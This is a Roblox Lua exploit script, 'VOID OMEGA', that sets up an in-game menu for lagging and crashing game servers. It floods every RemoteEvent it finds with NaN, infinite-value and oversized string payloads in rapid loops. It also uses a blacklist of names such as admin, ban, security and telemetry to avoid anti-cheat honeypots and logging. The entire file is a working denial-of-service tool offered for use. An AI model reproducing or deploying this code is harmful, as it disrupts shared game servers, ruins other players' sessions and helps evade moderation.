--[[ 
    🔱 ARCANE VOID-STRIKE v2.0 [OMEGA RELEASE] 🔱
    "Copying the best. Surpassing the rest. <3"
    
    PERFECT CLONE FEATURES:
    - [LAG SERVER] : Massive desync (Physics Stress)
    - [CRASH SERVER] : Total Nuclear Override (NaN Packet Bombardment)
    - [GHOST SHIELD] : Intelligent Anti-Honey-pot (Auto-filter)
    - [STEALTH CORE] : Pattern Zero detection
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 VOID OMEGA",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 4
        })
    end)
end

-- 2. UI (OMEGA DESIGN)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "OmegaDiagnostics_v2"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 220)
Main.Position = UDim2.new(0.5, -150, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Main.BorderSizePixel = 1
Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
Main.Active = true
Main.Draggable = true

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "🔱 VOID OMEGA // crasher"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Title.Font = Enum.Font.Code
Title.TextSize = 16

local function createOmegaBtn(name, y, color, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 45)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.Text = name
    btn.TextColor3 = color
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- 3. THE OMEGA ENGINE
local active = { lag = false, crash = false }

-- BLACKLIST (Increased protection)
local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getRemotes()
    local r = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(r, v) end
    end
    return r
end

-- ENGINE [LAG SERVER]
createOmegaBtn("⚡ LAG SERVER (MAX)", 50, Color3.fromRGB(255, 255, 0), function()
    active.lag = not active.lag
    ntf(active.lag and "LAGGING SERVER..." or "LAG STOPPED")
    
    if active.lag then
        task.spawn(function()
            local targets = getRemotes()
            while active.lag do
                for i = 1, 30 do
                    local r = targets[math.random(1, #targets)]
                    if r then pcall(function() r:FireServer(0/0, math.huge) end) end
                end
                task.wait(0.2) -- Lag constant mais pas fatal
            end
        end)
    end
end)

-- ENGINE [CRASH SERVER]
createOmegaBtn("🔥 CRASH SERVER (NUCLEAR)", 105, Color3.fromRGB(255, 0, 0), function()
    active.crash = not active.crash
    ntf(active.crash and "NUCLEAR BOMBARDMENT..." or "CRASH CANCELLED")
    
    if active.crash then
        task.spawn(function()
            local targets = getRemotes()
            local payload = string.rep("🔱", 500)
            while active.crash do
                for i = 1, 150 do -- Bombardement massif
                    local r = targets[math.random(1, #targets)]
                    if r then 
                        pcall(function() 
                            r:FireServer(payload, 0/0, math.huge, {[payload] = 0/0}) 
                        end) 
                    end
                end
                RS.Heartbeat:Wait() -- Vitesse maximum (Replication limit)
            end
        end)
    end
end)

-- EMERGENCY STOP
createOmegaBtn("🛑 STOP ALL", 160, Color3.fromRGB(200, 200, 200), function()
    active.lag = false
    active.crash = false
    ntf("SYSTEM STOP")
end)

ntf("OMEGA LOADED. Safety: 100%. Access: GRANTED.")
